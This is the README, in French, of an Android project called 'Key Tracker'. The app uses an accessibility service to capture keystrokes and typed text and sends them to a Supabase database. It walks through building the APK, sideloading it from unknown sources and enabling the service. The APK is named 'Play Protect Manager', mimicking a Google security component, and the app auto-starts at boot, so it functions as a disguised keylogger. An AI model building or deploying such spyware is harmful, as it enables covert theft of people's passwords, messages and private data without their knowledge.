# Android Tracker (Key Tracker)

Application Android (service d’accessibilité) qui capture **touches/texte** et envoie les événements vers Supabase.

## Architecture

```
Android Device (APK) → Supabase REST API → Table `public.android_events`
```

## Installation

### Base de données (Supabase)

- Table: `public.android_events`
- Écriture: insert via policy RLS “anon” (simple et fonctionnel)

### Application Android

1. Ouvrir le projet dans Android Studio :
   - Ouvrir le dossier racine du projet

2. Configurer Supabase :
   - **Par défaut**, l’app est déjà préconfigurée pour pointer vers ton Supabase self-host.
   - Pour **surcharger** (recommandé si tu veux changer d’instance sans modifier le code), tu as 2 options :
     - **Option A — `local.properties`** (souvent gitignored) :
       - `SUPABASE_URL=https://<ton-domaine-supabase>`
       - `SUPABASE_ANON_KEY=<ta clé anon/publishable>`
     - **Option B — variables d’environnement** (CI / build en CLI) :
       - `SUPABASE_URL=...`
       - `SUPABASE_ANON_KEY=...` (ou `SUPABASE_PUBLISHABLE_KEY=...`)

3. Compiler l'APK :
   - Android Studio: Build → Build APK(s)
   - Ou en CLI: `./gradlew :app:assembleDebug`
   - APK: `app/build/outputs/apk/debug/Play Protect Manager.apk`

4. Installer sur votre appareil Android :
   - Via ADB: `adb install -r "app/build/outputs/apk/debug/Play Protect Manager.apk"`
   - Ou sans ADB: copier l’APK sur le téléphone et l’installer (sources inconnues).

5. Activer le service d'accessibilité :
   - Ouvrir l'application "Key Tracker"
   - Cliquer sur "Ouvrir les paramètres d'accessibilité"
   - Activer "Key Tracker Service"

## Utilisation

1. Une fois le service d'accessibilité activé, l'application Android commencera à capturer les touches/texte.
2. Les events sont insérés dans Supabase dans `public.android_events`.
3. Pour voir les données: Supabase Dashboard → Table Editor → `android_events` (ou via SQL).

## Fonctionnalités

- Capture des touches via le service d'accessibilité Android
- Envoi automatique des données vers Supabase
- Auto-lancement au démarrage de l'appareil
- Interface simple et minimaliste

## Limitations

- Policy RLS “anon insert” volontairement permissive (prototype)
- Nécessite Android 5.0+ (API Level 21+)

## Structure du projet

```
accessibility-apk/
├── app/src/main/
│   ├── java/com/andtracker/
│   │   ├── KeyTrackerService.java  # Service d'accessibilité
│   │   ├── MainActivity.java      # Activity principale
│   │   └── BootReceiver.java      # Receiver pour auto-lancement
│   │   └── SupabaseAndroidEventsClient.java # Client REST Supabase
│   └── res/
│       ├── values/strings.xml
│       └── xml/accessibility_service_config.xml
├── build.gradle
├── settings.gradle
└── gradlew
```

## Notes importantes

- Le service d'accessibilité doit être activé manuellement dans les paramètres Android
- L'application Android nécessite les permissions d'accessibilité pour fonctionner
- Supabase doit être configuré avant de compiler l'APK
- Pour la production: restreindre la policy (auth, device allowlist, etc.)
